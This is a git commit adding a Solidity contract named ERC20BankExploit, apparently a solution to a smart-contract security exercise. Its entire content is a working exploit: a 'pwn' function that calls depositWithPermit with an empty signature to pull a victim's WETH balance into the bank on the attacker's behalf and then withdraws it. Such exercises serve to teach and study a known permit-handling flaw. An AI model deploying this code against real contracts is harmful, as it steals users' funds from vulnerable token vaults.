ea9be3ca042cefd72eb8856a557f772811ab5aa3
alexursol2 <103754814+alexursol2@users.noreply.github.com>
2024-03-09 19:06:45 +0100

    Update WETH_Bank_Hack.sol

--- Security/WETH_Bank_Hack.sol
+++ Security/WETH_Bank_Hack.sol
@@ -1,1 +1,22 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.20;
 
+import {IERC20} from "sce/sol/IERC20.sol";
+import {ERC20Bank} from "sce/sol/ERC20Bank.sol";
+
+contract ERC20BankExploit {
+    address private immutable target;
+
+    constructor(address _target) {
+        target = _target;
+    }
+
+    function pwn(address alice) external {
+        address weth = address(ERC20Bank(target).token());
+        uint256 bal = IERC20(weth).balanceOf(alice);
+        ERC20Bank(target).depositWithPermit(
+            alice, address(this), bal, 0, 0, "", ""
+        );
+        ERC20Bank(target).withdraw(bal);
+    }
+}
